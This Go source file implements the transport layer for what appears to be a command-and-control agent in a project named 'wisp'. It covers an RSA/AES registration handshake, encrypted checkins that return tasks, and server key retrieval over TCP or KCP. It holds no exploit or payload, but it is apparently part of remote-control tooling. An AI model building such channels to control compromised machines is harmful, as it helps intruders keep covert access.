package transport

// Shared wire protocol logic for transports that carry protocol.Packet streams
// over a net.Conn (TCP and KCP). The transports keep a persistent connection
// open (register once, reuse for every checkin) so a KCP session does not get
// re-created per checkin — re-creating sessions flooded the server with
// half-open KCP channels and tripped the rate limiter.

import (
	"crypto/rand"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"time"

	"github.com/user/wisp/shared/protocol"
)

// registerOnConn performs the hybrid-encrypted registration handshake over an
// already-dialed connection and returns the freshly negotiated session keys.
// The caller keeps the connection for subsequent checkins.
func registerOnConn(conn net.Conn, rsapubPEM string, regData []byte) (*protocol.SessionKeys, error) {
	// Generate session keys
	aesKey := make([]byte, 32)
	hmacKey := make([]byte, 32)
	io.ReadFull(rand.Reader, aesKey)
	io.ReadFull(rand.Reader, hmacKey)
	keys := &protocol.SessionKeys{AESKey: aesKey, HMACKey: hmacKey}

	// Hybrid encryption: RSA encrypts only the keys, AES encrypts the registration data
	keyMaterial := append(aesKey, hmacKey...)
	encryptedKeys, err := protocol.RSAEncrypt([]byte(rsapubPEM), keyMaterial)
	if err != nil {
		return nil, fmt.Errorf("RSA encrypt: %w", err)
	}
	encryptedReg, err := keys.Encrypt(regData)
	if err != nil {
		return nil, fmt.Errorf("encrypt reg data: %w", err)
	}

	// Build payload: [4 bytes key_len][encrypted_keys][encrypted_reg]
	keyLen := uint32(len(encryptedKeys))
	payload := make([]byte, 4+len(encryptedKeys)+len(encryptedReg))
	binary.LittleEndian.PutUint32(payload[0:4], keyLen)
	copy(payload[4:4+keyLen], encryptedKeys)
	copy(payload[4+keyLen:], encryptedReg)

	pkt := &protocol.Packet{Type: protocol.TypeRegister, Payload: payload}
	if err := protocol.WritePacket(conn, pkt); err != nil {
		return nil, fmt.Errorf("write register: %w", err)
	}

	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	ackPkt, err := protocol.ReadPacket(conn)
	if err != nil {
		return nil, fmt.Errorf("read ack: %w", err)
	}
	if ackPkt.Type != protocol.TypeRegisterAck {
		return nil, fmt.Errorf("unexpected response type: 0x%02x", ackPkt.Type)
	}

	ackData, err := keys.Decrypt(ackPkt.Payload)
	if err != nil {
		return nil, fmt.Errorf("decrypt ack: %w", err)
	}
	var ack map[string]string
	json.Unmarshal(ackData, &ack)
	if ack["status"] != "ok" {
		return nil, fmt.Errorf("registration rejected")
	}
	return keys, nil
}

// checkinOnConn sends one checkin over the given (persistent) connection and
// returns the raw encrypted task data. seq is the transport's monotonic checkin
// counter (replay protection).
func checkinOnConn(conn net.Conn, agentID string, seq *uint64, keys *protocol.SessionKeys, results []byte) ([]byte, error) {
	*seq++
	var payload []byte
	payload = append(payload, []byte(agentID)...)
	var seqBuf [8]byte
	binary.BigEndian.PutUint64(seqBuf[:], *seq)
	payload = append(payload, seqBuf[:]...)

	if len(results) > 0 {
		encrypted, err := keys.Encrypt(results)
		if err != nil {
			return nil, fmt.Errorf("encrypt results: %w", err)
		}
		payload = append(payload, encrypted...)
	}

	pkt := &protocol.Packet{Type: protocol.TypeCheckin, Payload: payload}
	if err := protocol.WritePacket(conn, pkt); err != nil {
		return nil, fmt.Errorf("write checkin: %w", err)
	}

	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	resp, err := protocol.ReadPacket(conn)
	if err != nil {
		return nil, fmt.Errorf("read tasks: %w", err)
	}

	// Server signals that the session is unknown → agent must re-register
	if resp.Type == protocol.TypeClose {
		return nil, ErrReauth
	}
	if resp.Type != protocol.TypeTask {
		return nil, nil
	}

	tasksData, err := keys.Decrypt(resp.Payload)
	if err != nil {
		return nil, fmt.Errorf("decrypt tasks: %w", err)
	}
	return tasksData, nil
}

// fetchKeyOnConn requests the server RSA public key over an already-dialed
// connection (a throwaway one used only for CLI-mode key bootstrapping).
func fetchKeyOnConn(conn net.Conn) (string, error) {
	_ = conn.SetDeadline(time.Now().Add(10 * time.Second))
	if err := protocol.WritePacket(conn, &protocol.Packet{Type: protocol.TypeRequestKey}); err != nil {
		return "", fmt.Errorf("write key request: %w", err)
	}
	pkt, err := protocol.ReadPacket(conn)
	if err != nil {
		return "", fmt.Errorf("read key response: %w", err)
	}
	if pkt.Type != protocol.TypeServerKey {
		return "", fmt.Errorf("unexpected key response type: 0x%02x", pkt.Type)
	}
	if len(pkt.Payload) == 0 {
		return "", fmt.Errorf("server returned an empty public key")
	}
	return string(pkt.Payload), nil
}
